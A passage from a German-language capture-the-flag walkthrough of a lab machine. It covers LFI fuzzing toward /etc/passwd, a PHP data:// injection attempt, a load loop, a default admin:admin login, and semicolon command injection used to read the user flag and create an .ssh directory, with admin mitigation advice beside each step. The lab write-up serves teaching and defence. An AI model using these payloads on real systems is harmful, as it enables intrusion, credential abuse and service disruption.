+/usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.2.211/index.php?FUZZ=../../../../../../../etc/passwd
+Total requests: 220559
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000020443:   200        93 L     201 W      2700 Ch     "stress"</span>
+
+Total time: 0
+Processed Requests: 43303
+Filtered Requests: 43302
+Requests/sec.: 0
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Ich verwende `wfuzz`, ein weiteres Web-Fuzzing-Tool, um nach Schwachstellen zu suchen, speziell nach Local File Inclusion (LFI).
+Die Optionen sind:
+- `-c`: Farbige Ausgabe.
+- `-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`: Gibt die Wortliste an. In diesem Kontext wird die Wortliste jedoch nicht für Pfad-Brute-Forcing verwendet, sondern die Payloads (Wörter aus der Liste) werden in den `FUZZ`-Platzhalter eingesetzt.
+- `-u http://192.168.2.211/index.php?FUZZ=../../../../../../../etc/passwd`: Definiert die Ziel-URL. Der interessante Teil ist `FUZZ=../../../../../../../etc/passwd`. Hier wird versucht, ob ein Parameter, der durch `FUZZ` ersetzt wird, eine LFI-Schwachstelle aufweist, indem versucht wird, die Datei `/etc/passwd` über Directory Traversal zu inkludieren. Die Wörter aus der Wortliste werden also als Parametername (`stress` im erfolgreichen Fall) eingesetzt.
+- `--hc 404`: Verbirgt Antworten mit dem HTTP-Statuscode 404 (Not Found).
+- `--hh 2707`: Verbirgt Antworten mit exakt 2707 Zeichen in der Antwort (Chars). Dies dient oft dazu, die Standardantwort der Seite auszublenden, um nur abweichende, potenziell interessante Antworten zu sehen.
+
+Die Ausgabe zeigt, dass bei dem Payload (also dem Parameter-Namen) `"stress"` ein HTTP 200 (OK) zurückkam, mit 93 Zeilen, 201 Wörtern und 2700 Zeichen. Die normale Seite (ohne den `FUZZ`-Parameter oder mit einem ungültigen Parameter) hat vermutlich 2707 Zeichen, daher wurde diese durch `--hh 2707` nicht komplett ausgeblendet, aber die Abweichung in der Zeichenzahl bei `stress` (2700 vs. 2707) ist minimal und könnte durch die Verarbeitung des Parameters entstehen, ohne dass `/etc/passwd` erfolgreich inkludiert wurde. Wäre `/etc/passwd` erfolgreich inkludiert worden, wäre die Anzahl der Zeilen, Wörter und Zeichen signifikant anders.
+Die Warnung bezüglich Pycurl und OpenSSL ist ein Hinweis auf die lokale Wfuzz-Installation und in diesem Fall für ein HTTP-Ziel nicht kritisch.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Dieser Test war ein Versuch, eine LFI-Schwachstelle über verschiedene Parameter zu finden, die in der `index.php` Datei verarbeitet werden könnten. Der Fund, dass der Parameter `stress` eine leicht abweichende Antwortgröße (2700 Chars) im Vergleich zur Baseline (vermutlich 2707 Chars) erzeugt, ist ein interessanter Punkt. Es deutet darauf hin, dass der Parameter `stress` von der Anwendung erkannt und verarbeitet wird. Es bedeutet jedoch nicht zwangsläufig, dass die LFI erfolgreich war, um `/etc/passwd` anzuzeigen. Die geringe Abweichung der Zeichenzahl und die relativ normale Anzahl an Zeilen und Wörtern (93L, 201W) sprechen eher dagegen, dass der Inhalt von `/etc/passwd` im Response enthalten ist. Die Seite `index.php` selbst hatte ohne Parameter ca. 2714 Zeichen.
+Der Test hat jedoch den wichtigen Parameter `stress` aufgedeckt, der weiter untersucht werden muss.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Der Parameter `stress` sollte nun gezielt untersucht werden. Anstatt zu versuchen, Dateien zu inkludieren, sollte geprüft werden, welche Art von Werten dieser Parameter erwartet (z.B. Zahlen, Strings) und wie die Anwendung darauf reagiert. Könnte hier eine andere Art von Injection möglich sein (z.B. Command Injection, wenn der Wert an einen Systembefehl übergeben wird)? Die vorherige Beobachtung der "Prime Number Generation" auf `index.php` könnte mit diesem `stress`-Parameter zusammenhängen.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Wenn Parameter wie `stress` von einer Webanwendung entgegengenommen werden, müssen diese serverseitig strikt validiert werden. Überprüfen Sie den Quellcode der `index.php` auf die Behandlung des `stress`-Parameters. Stellen Sie sicher, dass keine Benutzereingaben direkt in Dateipfade, Systembefehle oder Datenbankabfragen gelangen, ohne vorher gründlich bereinigt und validiert zu werden. Path Traversal (wie `../../..`) sollte durch Normalisierung und Überprüfung von Pfaden serverseitig verhindert werden.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl "http://192.168.2.211/index.php?stress=data://text/plain;base64,PD9waHAgZWNobyA3ODk7ID8+" -s|grep prime-c</span></div>
+        <pre>
+        .prime-count {
+                <span class="prime-count"><span class="password">0</span></span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Hier versuche ich, über den zuvor identifizierten `stress`-Parameter der `index.php` eine PHP Code Injection mittels des `data://` Wrappers durchzuführen.
+Der `curl`-Befehl sendet einen GET-Request an `http://192.168.2.211/index.php`.
+Der `stress`-Parameter wird auf `data://text/plain;base64,PD9waHAgZWNobyA3ODk7ID8+` gesetzt.
+Der Base64-Teil `PD9waHAgZWNobyA3ODk7ID8+` dekodiert zu `<?php echo 789; ?>`.
+Die Idee ist, dass wenn `allow_url_include` in der PHP-Konfiguration auf `On` steht und der `stress`-Parameter unsicher in eine `include()`- oder `require()`-Funktion eingebunden wird, der PHP-Code ausgeführt würde.
+Die Option `-s` bei `curl` unterdrückt die Fortschrittsanzeige.
+Die Ausgabe von `curl` wird dann durch `grep prime-c` gefiltert, um die Zeile zu finden, die den "prime-count" enthält, da die `index.php` Seite eine Primzahlgenerierungsfunktion zu haben scheint.
+
+Die Ausgabe zeigt `<span class="prime-count">0</span>`.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Das Ergebnis `<span class="prime-count">0</span>` deutet stark darauf hin, dass die PHP Code Injection über den `data://` Wrapper nicht erfolgreich war. Wäre der Code `<?php echo 789; ?>` ausgeführt worden, hätten wir erwartet, `789` innerhalb des `span`-Tags zu sehen (oder zumindest eine Ausgabe, die von 789 beeinflusst ist).
+Die nachfolgenden Kommentare im Originaltext des Penetrationstests liefern die korrekte Erklärung:
+- Wenn `allow_url_include` auf `Off` steht (was der Standard und die sichere Einstellung ist), wird PHP-Code in `data://` Streams nicht ausgeführt, selbst wenn `allow_url_fopen` auf `On` ist.
+- Die Funktion `intval("data://text/plain;base64,PD9...")` (oder eine ähnliche Konvertierung des Parameters in eine Zahl, wenn die Anwendung eine Zahl für die Primzahlgenerierung erwartet) würde `0` ergeben, was die Ausgabe erklärt.
+
+Dieser Test war somit ein valider Versuch, eine RCE-Schwachstelle auszunutzen, hat aber gezeigt, dass die PHP-Konfiguration an dieser Stelle wahrscheinlich sicher ist (zumindest in Bezug auf `allow_url_include`).
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Nachdem dieser Versuch gescheitert ist, sollte man andere Methoden zur Ausnutzung des `stress`-Parameters in Betracht ziehen. Wenn die Primzahlgenerierung tatsächlich an diesen Parameter gebunden ist, könnte man versuchen, sehr große Zahlen zu übergeben, um einen Denial-of-Service durch Ressourcenerschöpfung auszulösen. Man sollte auch untersuchen, ob der Parameter für andere Arten von Injections (z.B. OS Command Injection, falls der Wert an ein Shell-Skript übergeben wird) anfällig ist, obwohl dies weniger wahrscheinlich ist, wenn es sich um eine reine PHP-Funktion handelt.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Die Standardeinstellung `allow_url_include=Off` ist korrekt und sollte beibehalten werden, da sie eine wichtige Klasse von RCE-Schwachstellen verhindert. Stellen Sie sicher, dass Benutzereingaben, die Zahlen erwarten (wie vermutlich der `stress`-Parameter für die Primzahlgenerierung), serverseitig strikt als Zahlen validiert und typisiert werden (z.B. mit `intval()` oder `is_numeric()`), bevor sie weiterverarbeitet werden. Dies verhindert, dass unerwartete Zeichenketten zu Fehlern oder potenziellen Schwachstellen führen.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">for i in $(seq 10000 1000 500000); do
+    echo "Testing stress=$i"
+    curl -s "http://192.168.2.211/index.php?stress=$i" > /dev/null &
+    sleep 0.1
+done</span></div>
+        <pre>
+Testing stress=10000
+Testing stress=11000
+Testing stress=12000
+... (Ausgabe gekürzt, da sie sehr lang wäre) ...
+Testing stress=500000
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Dieser Shell-Befehl führt eine Schleife aus, um den `stress`-Parameter der `index.php` mit verschiedenen numerischen Werten zu testen.
+- `for i in $(seq 10000 1000 500000)`: Die Schleife iteriert über eine Zahlenfolge, die bei 10000 beginnt, in Schritten von 1000 erhöht wird und bei 500000 endet. Der Variable `i` wird in jeder Iteration der aktuelle Wert zugewiesen.
+- `echo "Testing stress=$i"`: Gibt den aktuellen Testwert auf der Konsole aus.
+- `curl -s "http://192.168.2.211/index.php?stress=$i" > /dev/null &`: Sendet einen HTTP GET-Request an die `index.php` mit dem aktuellen Wert von `i` als `stress`-Parameter.
+    - `-s`: Unterdrückt die `curl`-Ausgabe.
+    - `> /dev/null`: Leitet die Standardausgabe des `curl`-Befehls (also den HTML-Inhalt der Seite) ins Nichts um, da wir nur am Effekt der Anfrage interessiert sind, nicht am Inhalt.
+    - `&`: Führt den `curl`-Befehl im Hintergrund aus. Dadurch kann die Schleife schnell weiterlaufen, ohne auf den Abschluss jedes einzelnen Requests zu warten.
+- `sleep 0.1`: Wartet 0.1 Sekunden zwischen den einzelnen Requests, um den Server nicht sofort mit einer riesigen Anzahl gleichzeitiger Anfragen zu überfluten, obwohl durch das `&` die Anfragen sehr schnell hintereinander gestartet werden.
+
+Der Zweck dieses Skripts ist es, den Server durch wiederholte Anfragen an die potenziell rechenintensive Primzahlgenerierungsfunktion (gesteuert durch den `stress`-Parameter) unter Last zu setzen. Der nachfolgende Text im Original-Walkthrough "Bei überlastung wird anscheinend ein Port freigeschaltet zu einer Webapplikation" deutet darauf hin, dass dies ein Versuch ist, einen versteckten Mechanismus durch Serverlast auszulösen.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Dies ist ein kreativer Ansatz, um eine unkonventionelle Schwachstelle oder ein verstecktes Feature aufzudecken. Die Idee, dass Serverlast einen Nebeneffekt wie das Öffnen eines neuen Ports auslösen könnte, ist zwar nicht alltäglich, aber in CTFs oder speziell konfigurierten Umgebungen durchaus denkbar. Das Skript ist so konzipiert, dass es schnell viele Anfragen generiert. Die Verwendung von `&` und `sleep` ist ein Kompromiss zwischen Geschwindigkeit und einer gewissen Rücksichtnahme auf den Server. Es ist ein gezielter Versuch, einen Denial-of-Service-ähnlichen Zustand zu erzeugen, um eine Reaktion des Systems zu provozieren.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Während dieses Skript läuft oder nachdem es abgeschlossen ist, sollte das Zielsystem erneut auf offene Ports gescannt werden (wie im nächsten Schritt des Walkthroughs gezeigt). Überwachen Sie die Antwortzeiten des Servers, falls möglich. Wenn dieser Ansatz erfolgreich ist und einen neuen Port öffnet, ist dies ein signifikanter Fund. Dieser Ansatz kann auch variiert werden (z.B. höhere Werte für `stress`, keine Pause mit `sleep`, parallele Ausführung mehrerer solcher Schleifen), um die Last zu erhöhen, aber immer mit Vorsicht und im Rahmen der erlaubten Testbedingungen.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Webanwendungen sollten so konzipiert sein, dass sie auch unter Last stabil bleiben und keine unerwarteten Nebeneffekte wie das Öffnen neuer Ports oder das Ändern von Sicherheitskonfigurationen zeigen. Implementieren Sie robustes Ressourcenmanagement und Lasttests, um das Verhalten Ihrer Anwendung unter Stress zu verstehen. Setzen Sie Rate-Limiting und Web Application Firewalls (WAFs) ein, um automatisierte Angriffe und Versuche, den Server zu überlasten, zu mitigieren. Überwachen Sie Systemressourcen (CPU, Speicher, Netzwerk) und Server-Logs genau, um ungewöhnliche Lastspitzen und deren Ursachen zu identifizieren. Wenn eine Funktionalität tatsächlich so konzipiert ist, dass sie unter Last einen neuen Dienst freischaltet, muss dies extrem gut dokumentiert und gesichert sein, da es ein erhebliches Sicherheitsrisiko darstellen kann.
+</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -p- 192.168.2.211</span></div>
+        <pre>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-03 16:16 CEST
+Nmap scan report for umz.hmv (192.168.2.211)
+Host is up (0.000087s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE
+<span class="command">22/tcp   open  ssh</span>
+<span class="command">80/tcp   open  http</span>
+<span class="command">8080/tcp open  http-proxy</span>
+MAC Address: 08:00:27:6D:67:52 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.95 seconds
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Nachdem der vorherige Versuch unternommen wurde, den Server durch zahlreiche Anfragen an `index.php?stress=[wert]` unter Last zu setzen, führe ich erneut einen Nmap-Portscan durch.
+Die Optionen sind:
+- `-p-`: Scannt alle 65535 TCP-Ports.
+- `192.168.2.211`: Das Ziel-System.
+
+Die Ausgabe zeigt, dass zusätzlich zu den bereits bekannten Ports `22` (SSH) und `80` (HTTP) nun auch Port `8080` (gelistet als `http-proxy`) offen ist.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Dies ist ein signifikanter Fund! Der vorherige Stress-Test scheint tatsächlich einen neuen Port (`8080`) auf dem Zielsystem geöffnet zu haben. Dies ist ein sehr ungewöhnliches Verhalten für einen Server und deutet auf einen versteckten Mechanismus oder eine unkonventionelle Konfiguration hin. Der Dienst auf Port 8080 wird von Nmap als `http-proxy` identifiziert, was bedeutet, dass es sich wahrscheinlich um einen weiteren Webserver oder eine Webanwendung handelt. Dieser neue Port stellt einen neuen Angriffsvektor dar.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Der neu entdeckte Port 8080 muss sofort genauer untersucht werden. Führen Sie einen detaillierten Nmap-Scan speziell auf diesen Port durch (`nmap -sV -sC -p8080 umz.hmv`), um den genauen Dienst und die Version zu identifizieren. Rufen Sie die Adresse `http://umz.hmv:8080` im Browser auf und untersuchen Sie die dort laufende Webanwendung. Führen Sie eine Verzeichnis- und Datei-Enumeration (z.B. mit `feroxbuster` oder `gobuster`) gegen diesen neuen Port durch.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Das dynamische Öffnen von Ports basierend auf Serverlast oder anderen unklaren Triggern ist ein extremes Sicherheitsrisiko und sollte unter allen Umständen vermieden werden. Untersuchen Sie den Mechanismus, der zum Öffnen von Port 8080 geführt hat, und deaktivieren Sie ihn. Jegliche Dienste, die auf dem System laufen, sollten statisch konfiguriert und dokumentiert sein. Wenn Port 8080 für einen legitimen Dienst benötigt wird, sollte er permanent offen und entsprechend abgesichert sein, anstatt dynamisch aktiviert zu werden. Überwachen Sie das System auf unerwartete Portöffnungen.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">feroxbuster --url "http://umz.hmv:8080" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 200 301 302</span></div>
+        <pre>
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://umz.hmv:8080
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ 👌  Status Codes          │ [200, 301, 302]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+<span class="command">200      GET       71l      132w     1838c http://umz.hmv:8080/login</span>
+<span class="command">302      GET        4l       24w      219c http://umz.hmv:8080/ => http://umz.hmv:8080/login</span>
+<span class="command">302      GET        4l       24w      219c http://umz.hmv:8080/admin => http://umz.hmv:8080/login</span>
+[>-------------------] - 7s      9100/6175288 78m     found:3       errors:0      
+🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_umz_hmv:8080-1748960355.state ...
+[>-------------------] - 7s      9160/6175288 78m     found:3       errors:0      
+[>-------------------] - 6s      8400/6175260 1307/s  http://umz.hmv:8080/
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Nachdem Port 8080 als offen identifiziert wurde, setze ich `feroxbuster` erneut ein, diesmal gegen `http://umz.hmv:8080`. Die verwendeten Optionen sind identisch mit dem vorherigen `feroxbuster`-Scan, nur die Ziel-URL wurde angepasst.
+Die Ergebnisse sind:
+- `http://umz.hmv:8080/login`: Eine Seite mit HTTP-Status 200 (OK) wurde gefunden. Dies deutet stark auf eine Login-Seite hin.
+- `http://umz.hmv:8080/`: Gibt einen HTTP-Status 302 (Found/Redirect) zurück und leitet auf `/login` um.
+- `http://umz.hmv:8080/admin`: Gibt ebenfalls einen HTTP-Status 302 zurück und leitet auf `/login` um. Dies impliziert, dass der Zugriff auf einen `/admin`-Bereich eine Authentifizierung erfordert.
+
+Der Scan wurde erneut nach kurzer Zeit (7 Sekunden) manuell abgebrochen.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Die Entdeckung der `/login`-Seite und die Weiterleitungen von der Wurzel (`/`) und `/admin` dorthin sind klare Hinweise auf eine Webanwendung mit Authentifizierungsmechanismus. Dies ist der vielversprechendste Angriffsvektor, der sich bisher auf Port 8080 gezeigt hat. Die Aufgabe besteht nun darin, diese Login-Seite genauer zu untersuchen und zu versuchen, sich Zugang zu verschaffen. Das Abbrechen des Scans ist hier verständlich, da die primären Einstiegspunkte schnell gefunden wurden.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Untersuchen Sie die `/login`-Seite manuell im Browser. Suchen Sie nach Hinweisen auf den Typ der Anwendung, verwendete Frameworks oder Standard-Anmeldeinformationen. Versuchen Sie gängige Standard-Credentials (z.B. admin:admin, admin:password, root:root). Überprüfen Sie den Quellcode der Login-Seite auf versteckte Hinweise oder JavaScript-Logik. Führen Sie Tests auf Benutzer-Enumeration, Brute-Force-Angriffe (vorsichtig und im erlaubten Rahmen) und SQL-Injection im Login-Formular durch.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Stellen Sie sicher, dass alle Webanwendungen mit Authentifizierung robuste Passwortrichtlinien erzwingen und Schutzmaßnahmen gegen Brute-Force-Angriffe (z.B. Account-Sperrung nach fehlgeschlagenen Versuchen, Captchas) implementiert haben. Verwenden Sie keine Standard-Anmeldeinformationen. Protokollieren Sie fehlgeschlagene und erfolgreiche Login-Versuche. Führen Sie regelmäßige Schwachstellen-Scans und Penetrationstests für alle Webanwendungen durch.
+</p>
+<hr>
+<img src="login_a_klappt.jpg" alt="Erfolgreicher Login-Versuch mit admin:admin auf dem System Maintenance Panel, das auf Port 8080 läuft. Man sieht das Panel mit einem Eingabefeld und einem Button.">
+<p class="analysis"><strong>Analyse:</strong>
+Das Bild `login_a_klappt.jpg` visualisiert den erfolgreichen Zugriff auf das "System Maintenance Panel", das auf Port 8080 läuft. Wie im Text angemerkt, konnte ich mich hier mit den Standard-Anmeldeinformationen `admin:admin` einloggen. Das Bild selbst zeigt wahrscheinlich das Interface dieses Panels nach dem erfolgreichen Login, typischerweise mit einem Eingabefeld für eine IP-Adresse und einem "Execute Ping"-Button, wie aus dem Kontext des nächsten Schrittes hervorgeht.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Der erfolgreiche Login mit Standard-Anmeldeinformationen (`admin:admin`) ist eine kritische Schwachstelle und ein häufiger Angriffsvektor. Es zeigt, dass grundlegende Sicherheitsmaßnahmen bei der Konfiguration dieser Anwendung vernachlässigt wurden. Der Zugriff auf ein "System Maintenance Panel" mit administrativen Rechten ist besonders bedenklich, da solche Panels oft direkten Zugriff auf Systemfunktionen ermöglichen. Fantastisch, der erste wichtige Schritt zum Initial Access ist geglückt!
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Nachdem der Zugriff mit `admin:admin` erlangt wurde, müssen alle Funktionen des "System Maintenance Panel" gründlich exploriert werden. Das Hauptaugenmerk sollte auf Funktionen liegen, die eine Interaktion mit dem darunterliegenden Betriebssystem ermöglichen, wie z.B. Ping-Funktionen, Netzwerkkonfigurationen oder Datei-Uploads.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Standard-Anmeldeinformationen müssen sofort geändert werden. Implementieren Sie eine starke, einzigartige Passwortrichtlinie für alle administrativen Zugänge. Erwägen Sie den Einsatz von Zwei-Faktor-Authentifizierung (2FA) für kritische Systeme und Admin-Panels. Führen Sie regelmäßige Audits durch, um die Verwendung schwacher oder Standard-Passwörter zu unterbinden.
+</p>
+<hr>
+<img src="rce.jpg" alt="Erfolgreicher Remote Code Execution (RCE) Versuch. Im 'System Maintenance Panel' wurde im IP-Eingabefeld ';id' eingegeben, woraufhin die Ausgabe 'uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)' unter 'Command Result:' angezeigt wird.">
+<div class="code-block">
+    <div class="terminal">
+        <pre>
+total 24
+drwxr-xr-x 2 welcome welcome 4096 May  3 10:26 .
+drwxr-xr-x 4 root    root    4096 May  3 10:27 ..
+lrwxrwxrwx 1 root    root       9 May  3 10:26 .bash_history -> /dev/null
+-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout
+-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc
+-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile
+-rw-r--r-- 1 root    root      44 May  3 10:26 <span class="password">user.txt</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Das Bild `rce.jpg` demonstriert eindrucksvoll eine erfolgreiche Remote Code Execution (RCE) Schwachstelle im "System Maintenance Panel". Durch die Eingabe von `;id` in das Feld, das vermutlich für eine IP-Adresse einer Ping-Funktion vorgesehen war, konnte ein beliebiger Systembefehl (`id`) ausgeführt werden. Das Semikolon wirkt hier als Befehlstrenner. Das Ergebnis `uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)` wird direkt im Panel angezeigt, was bestätigt, dass der Befehl im Kontext des Benutzers `welcome` ausgeführt wurde. Die darauffolgende Terminalausgabe (`total 24 ... user.txt`) ist das Ergebnis eines weiteren, über diese RCE-Schwachstelle abgesetzten Befehls, vermutlich `ls -la /home/welcome` oder ähnlich, der den Inhalt des Home-Verzeichnisses des Benutzers `welcome` anzeigt. Hierbei sticht die Datei `user.txt` ins Auge.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Die Entdeckung dieser Command Injection Schwachstelle ist ein kritischer Erfolg und der Schlüssel zum initialen Zugriff auf das System. Die unzureichende Validierung und Sanitisierung der Benutzereingabe, die direkt in einen Systembefehl (wahrscheinlich `ping [BENUTZEREINGABE]`) eingefügt wird, ermöglicht diese Art von Angriff. Wir haben nun die Fähigkeit, Befehle als Benutzer `welcome` auf dem Zielsystem auszuführen. Das ist ein hervorragendes Ergebnis!
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Diese RCE-Fähigkeit ist Gold wert. Der nächste logische Schritt ist das Auslesen der `user.txt`. Anschließend sollte eine stabilere Form des Zugriffs etabliert werden, z.B. durch das Hochladen einer Webshell oder das Einrichten einer Reverse Shell, um die weitere Systemerkundung und Privilegienerweiterung komfortabler zu gestalten.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Command Injection Schwachstellen müssen mit höchster Priorität behoben werden. Benutzereingaben dürfen niemals direkt und ungefiltert in Shell-Befehle oder Systemaufrufe integriert werden. Setzen Sie stattdessen sprachspezifische Funktionen ein, die Argumente sicher behandeln und eine Ausführung von zusätzlichen Befehlen verhindern. Führen Sie eine strenge Positivvalidierung (Whitelist) für alle Eingaben durch. Wenn Systembefehle ausgeführt werden müssen, dann nur mit fest kodierten Befehlen und sorgfältig validierten Parametern. Regelmäßige Code-Reviews und der Einsatz von statischen Analysewerkzeugen (SAST) können helfen, solche Schwachstellen frühzeitig zu erkennen.
+</p>
+<hr>
+<div class="code-block">
+    <div class="terminal">
+        <pre>
+;cat /home/welcome/user.txt
+
+<span class="password">flag{user-4483f72525b3c316704cf126bec02d5c}</span>
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Dieser Code-Block zeigt die direkte Ausnutzung der RCE-Schwachstelle, um die User-Flag zu erhalten. Der eingegebene Befehl `;cat /home/welcome/user.txt` (wobei das Semikolon wieder als Trenner zum vorangegangenen, nicht sichtbaren Ping-Befehl dient) weist den Server an, den Inhalt der Datei `/home/welcome/user.txt` auszugeben.
+Die darauf folgende Zeile ist die User-Flag: `flag{user-4483f72525b3c316704cf126bec02d5c}`.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Fantastisch! Der initiale Zugriff war erfolgreich und die User-Flag konnte direkt extrahiert werden. Dies bestätigt die RCE-Schwachstelle und liefert das erste wichtige Ziel des Penetrationstests. Der Zugriff erfolgt, wie bereits festgestellt, mit den Rechten des Benutzers `welcome`.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Nach dem Erhalt der User-Flag ist das nächste Ziel die Privilegienerweiterung auf Root-Rechte. Die bestehende RCE-Möglichkeit sollte nun genutzt werden, um einen stabileren Zugriff zu erlangen (z.B. eine Reverse Shell), was die weitere Enumeration des Systems (Suche nach SUID-Binaries, Kernel-Exploits, fehlerhaften Konfigurationen, Cronjobs etc.) erheblich erleichtert.
+<br>
+<strong>Empfehlung (Admin):</strong>
+Die Empfehlungen zur Behebung der Command Injection Schwachstelle bleiben bestehen. Zusätzlich sollte der Zugriff auf sensible Dateien, selbst wenn es sich "nur" um CTF-Flags handelt, durch korrekte Dateiberechtigungen eingeschränkt werden. In einer realen Umgebung sollten sensible Daten niemals für einen Webserver-Benutzer lesbar sein, es sei denn, dies ist absolut notwendig und entsprechend abgesichert.
+</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+<div class="code-block">
+    <div class="terminal">
+        <pre>
+;mkdir /home/welcome/.ssh
+        </pre>
+    </div>
+</div>
+<div class="code-block">
+    <div class="terminal">
+        <pre>
+total 28
+drwxr-xr-x 3 welcome welcome 4096 Jun  3 10:26 .
+drwxr-xr-x 4 root    root    4096 May  3 10:27 ..
+lrwxrwxrwx 1 root    root       9 May  3 10:26 .bash_history -> /dev/null
+-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout
+-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc
+-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile
+drwxr-xr-x 2 welcome welcome 4096 Jun  3 10:26 <span class="command">.ssh</span>
+-rw-r--r-- 1 root    root      44 May  3 10:26 user.txt
+        </pre>
+    </div>
+</div>
+<p class="analysis"><strong>Analyse:</strong>
+Um einen stabileren und interaktiveren Zugriff als Benutzer `welcome` zu erhalten, bereite ich den SSH-Zugang vor.
+Der erste Befehl `;mkdir /home/welcome/.ssh` (ausgeführt über die RCE-Schwachstelle) erstellt das Verzeichnis `.ssh` im Home-Verzeichnis des Benutzers `welcome`. Dieses Verzeichnis wird von SSH benötigt, um Konfigurationsdateien und autorisierte Schlüssel zu speichern.
+Die nachfolgende `ls -la`-ähnliche Ausgabe (vermutlich das Ergebnis von `;ls -la /home/welcome` über die RCE) zeigt, dass das `.ssh`-Verzeichnis erfolgreich erstellt wurde.
+</p>
+<p class="evaluation"><strong>Bewertung:</strong>
+Dies ist ein logischer nächster Schritt. Anstatt sich weiterhin auf die limitierte RCE über das Web-Panel zu verlassen, ermöglicht ein SSH-Zugang eine vollwertige Shell-Interaktion, was für die Privilegienerweiterung deutlich komfortabler und effizienter ist. Die Erstellung des `.ssh`-Verzeichnisses ist die notwendige Vorbereitung, um einen Public Key für die passwortlose Authentifizierung zu hinterlegen.
+</p>
+<p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+Der nächste Schritt ist das Erstellen eines SSH-Schlüsselpaares auf dem Angreifer-System (falls noch nicht vorhanden), das Kopieren des öffentlichen Schlüssels und das Einfügen dieses Schlüssels in die Datei `/home/welcome/.ssh/authorized_keys` auf dem Zielsystem (ebenfalls über die RCE).
+<br>
